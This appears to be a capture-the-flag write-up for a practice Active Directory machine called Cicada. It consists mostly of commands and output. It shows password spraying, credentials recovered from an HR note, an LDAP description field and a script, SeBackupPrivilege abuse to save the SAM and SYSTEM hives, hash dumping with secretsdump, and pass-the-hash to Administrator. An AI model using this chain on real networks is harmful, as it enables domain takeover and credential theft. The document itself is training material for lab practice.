

```
nmap -sCV -v -p- -T4 10.129.231.149 -oA nmap/cicada
...
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-10 20:24:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: 2026-04-10T20:25:59+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: 2026-04-10T20:25:58+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-10T20:25:59+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-10T20:25:58+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49726/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-10T20:25:18
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s


```

```
nxc ldap 10.129.231.149                                
LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)

┌──(lanc3㉿kali)-[/opt/tools/username-anarchy]
└─$ nxc smb 10.129.231.149
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)          
```

smbclient -L //10.129.231.149 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.231.149 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available




```
cat "Notice from HR.txt"

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

---

```
netexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                                                                           
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

cat cicada-users.txt                  
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars


```
netexec smb 10.129.231.149 -u cicada-users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                                                                           
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 

```

user: michael.wrightson
password: Cicada$M6Corpb*@Lp#nZp!8

smbclient //10.129.231.149/DEV -U 'cicada.htb\michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8'

```
smbclient //10.129.231.149/DEV -U 'cicada.htb\michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8'
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> quit

```

these credentials do not have privileges for smb access to /DEV
but they can do nxc ldap

found password for david.orelious = aRt$Lp#7t*VQ!3 

smbclient //10.129.231.149/DEV -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3'

------



```
netexec ldap 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.129.231.149  389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.129.231.149  389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-                        
LDAP        10.129.231.149  389    CICADA-DC        Administrator                 2024-08-27 04:08:03 0        Built-in account for administering the computer/domain                                                                                                                                   
LDAP        10.129.231.149  389    CICADA-DC        Guest                         2024-08-29 01:26:56 0        Built-in account for guest access to the computer/domain                                                                                                                                 
LDAP        10.129.231.149  389    CICADA-DC        krbtgt                        2024-03-14 19:14:10 0        Key Distribution Center Service Account                                                                                                                                                  
LDAP        10.129.231.149  389    CICADA-DC        john.smoulder                 2024-03-14 20:17:29 1                                             
LDAP        10.129.231.149  389    CICADA-DC        sarah.dantelia                2024-03-14 20:17:29 1                                             
LDAP        10.129.231.149  389    CICADA-DC        michael.wrightson             2024-03-14 20:17:29 0                                             
LDAP        10.129.231.149  389    CICADA-DC        david.orelious                2024-03-14 20:17:29 1        Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                                                                      
LDAP        10.129.231.149  389    CICADA-DC        emily.oscars                  2024-08-23 05:20:17 1     
```

smbclient -L //10.129.231.149 -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3'


```
smbclient //10.129.231.149/DEV -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3' 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 20:31:39 2024
  ..                                  D        0  Thu Mar 14 20:21:29 2024
  Backup_script.ps1                   A      601  Thu Aug 29 01:28:22 2024

                4168447 blocks of size 4096. 459433 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (12.2 KiloBytes/sec) (average 12.2 KiloBytes/sec)
smb: \> quit
 
┌──(lanc3㉿kali)-[~]
└─$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

emily.oscars
Q!3@Lp#M6b*7t*Vt

nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' 

```
nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'        
WINRM       10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
...
WINRM       10.129.231.149  5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)

```

evil-winrm -i 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
...


---

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
edd4d1418fb912461cab41fe88616df9
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 

-----


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

-----

combination of **`SeBackupPrivilege`** and **`SeRestorePrivilege`** is a classic path to **Domain Admin** (or at least Local System). These privileges are designed to allow backup software to read/write any file on the system, bypassing all Access Control Lists (ACLs).

On a Domain Controller, this means you can copy the **NTDS.dit** file—the database that contains every password hash for every user in the entire domain.

note: tried diskshadow method, did not work


---

## The Attack Path: Dumping the NTDS.dit

Since you are on a Domain Controller (CICADA-DC), your goal is to extract the hashes for the **Administrator** account.


---------


## Escalating via SeBackupPrivilege

Upon checking our current user's privileges, we discover that `SeBackupPrivilege` is enabled. While this privilege is typically reserved for service accounts or backup operators, its presence here is a critical misconfiguration.


Designed to allow backup software to function without being blocked by file permissions, `SeBackupPrivilege` grants the holder the ability to read **any** file on the system, effectively bypassing all Access Control Lists (ACLs). In an Active Directory environment, this is a "Game Over" privilege because it allows us to touch protected files that are usually off-limits to standard users—specifically the Windows Registry Hives.

By leveraging this privilege, we can extract two specific hives required to compromise the machine:

- **SAM (Security Account Manager):** Stores local user account information and NTLM password hashes.
    
- **SYSTEM:** Contains the system boot key (SysKey), which is essential for decrypting the hashes stored in the SAM or the NTDS database.
    

### The Attack Path: Dumping Hashes

The strategy is straightforward: we will use the `reg save` command to export these hives to our local working directory. This allows us to move the sensitive data off the target for offline cracking or a **Pass-the-Hash (PtH)** attack.

Once we possess the NTLM hash for the local **Administrator**, we no longer need a plaintext password. We can simply use the hash to authenticate and gain full control over the system.

### Execution

First, we save the hives:



reg save hklm\sam sam

reg save hklm\system system

----------

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> dir


    Directory: C:\Users\emily.oscars.CICADA\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/11/2026   2:36 AM          49152 sam
-a----         4/11/2026   2:04 AM             83 shadow.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> download sam

Info: Downloading C:\Users\emily.oscars.CICADA\Temp\sam to sam

Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> download system
  
Info: Downloading C:\Users\emily.oscars.CICADA\Temp\system to system

Info: Download successful!

```


-----
on kali machine:

ls -la | grep sam
-rw-rw-r--  1 lanc3 lanc3      49152 Apr 11 10:38 sam

ls -la | grep system
-rw-rw-r--  1 lanc3 lanc3   18546688 Apr 11 10:39 system


-------

impacket-secretsdump -sam sam -system system local

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

Administrator NTLM hash is 
## 2b87e7c93a3e8a0ea4a581937016f341 

We can use it to directly log in to the account with Evil-WinRM by passing it as a parameter with -H

------

evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.129.231.149

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/11/2026   1:10 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a0a7402ed6f469a3561b0ded261b4cd9
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
cicada\administrator
